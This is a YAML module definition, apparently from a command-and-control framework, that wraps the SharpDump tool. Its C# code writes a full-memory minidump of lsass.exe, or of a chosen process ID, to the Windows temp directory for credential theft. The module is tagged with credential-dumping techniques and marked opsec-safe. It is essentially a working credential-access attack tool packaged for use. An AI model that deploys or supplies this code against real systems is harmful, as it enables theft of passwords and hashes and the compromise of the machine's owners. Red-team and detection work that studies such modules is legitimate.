name: SharpDump
authors:
  - name: Anthony Rose
    handle: Cx01N
    link: https://twitter.com/Cx01N_
description: |
  This module uses SharpDump which is a C# of the PowerShell Out-MiniDump.
  This module uses P/Invoke to call MiniDumpWriteDump from dbghelp.dll and create
  a full-memory minidump of a target process such as lsass.exe. The resulting dump
  is compressed and saved to disk as a .bin file in the system's temp directory.
software: ''
tactics: [TA0006, TA0007]
techniques: [T1003, T1555.03]
background: false
output_extension: ''
needs_admin: false
opsec_safe: true
language: csharp
min_language_version: ''
options:
  - name: ProcessID
    description: ProcessID of the process to createa dump file of.
    required: true
    value: ''
    strict: false
    suggested_values: []
csharp:
  UnsafeCompile: false
  CompatibleDotNetVersions:
    - Net35
    - Net40
  Code: |
    using System;
    using System.IO;
    using SharpDump;

    public static class Program
    {
        public static void Main(string[] args)
        {
            string processID = args.Length > 0 ? args[0] : "";
            string result = DumpProcessMemory(processID);
            Console.WriteLine(result);
        }

        public static string DumpProcessMemory(string processID = "")
        {
            using (StringWriter stringWriter = new StringWriter())
            {
                TextWriter originalOutput = Console.Out;
                TextWriter originalError = Console.Error;
                Console.SetOut(stringWriter);
                Console.SetError(stringWriter);

                try
                {
                    string[] args = processID.Split(' ');

                    string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
                    string dumpDir = $"{systemRoot}\\Temp\\";
                    if (!Directory.Exists(dumpDir))
                    {
                        Console.WriteLine($"\n[X] Dump directory \"{dumpDir}\" doesn't exist!\n");
                    }
                    else
                    {
                        if (string.IsNullOrEmpty(processID))
                        {
                            SharpDump.Program.Minidump(); // Dump LSASS by default
                        }
                        else if (args.Length == 1 && int.TryParse(args[0], out int retNum))
                        {
                            SharpDump.Program.Minidump(retNum); // PID specified
                        }
                        else
                        {
                            Console.WriteLine("\nPlease use \"SharpDump.exe [pid]\" format\n");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("\r\n[!] Unhandled SharpDump exception:\r\n");
                    Console.WriteLine(ex);
                }
                finally
                {
                    Console.SetOut(originalOutput);
                    Console.SetError(originalError);
                }

                return stringWriter.ToString();
            }
        }
    }
  ReferenceSourceLibraries:
    - Name: SharpDump
      Description: SharpDump is a C# port of PowerSploit's Out-Minidump.ps1 functionality.
      Location: SharpDump\
      Language: CSharp
      CompatibleDotNetVersions:
        - Net35
        - Net40
      ReferenceAssemblies:
        - Name: System.dll
          Location: net40\System.dll
          DotNetVersion: Net40
        - Name: System.Core.dll
          Location: net40\System.Core.dll
          DotNetVersion: Net40
        - Name: mscorlib.dll
          Location: net40\mscorlib.dll
          DotNetVersion: Net40
        - Name: mscorlib.dll
          Location: net35\mscorlib.dll
          DotNetVersion: Net35
        - Name: System.Core.dll
          Location: net35\System.Core.dll
          DotNetVersion: Net35
        - Name: System.dll
          Location: net35\System.dll
          DotNetVersion: Net35
      EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
